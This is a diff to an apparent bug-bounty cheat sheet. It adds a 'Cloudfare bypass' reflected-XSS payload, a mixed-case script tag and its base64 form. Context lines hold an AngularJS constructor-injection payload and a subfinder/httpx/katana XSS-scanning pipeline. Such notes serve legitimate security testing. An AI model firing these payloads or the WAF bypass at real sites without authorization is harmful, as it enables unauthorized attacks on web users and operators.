@@ -591,6 +591,12 @@ cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|p
 	-Payload: %7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D
 14-   29- echo http://vulnweb.com | subfinder -silent | httpx -silent | katana -d 10 -silent | gf xss | Gxss -c 100 -p XssReflected | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
 
+15- Cloudfare bypass rxss payload :
+
+	<ScRiPt >confirm(1)</ScRiPt> [❌Blocked]
+	
+	PFNjUmlQdCA+Y29uZmlybSgxKTwvU2NSaVB0Pg==
+
 -----------------------------------------------------------------------------------------------------------------------------------------------
 Signup
 1- create account with username or email address 	aa@gmail.com => password => 123
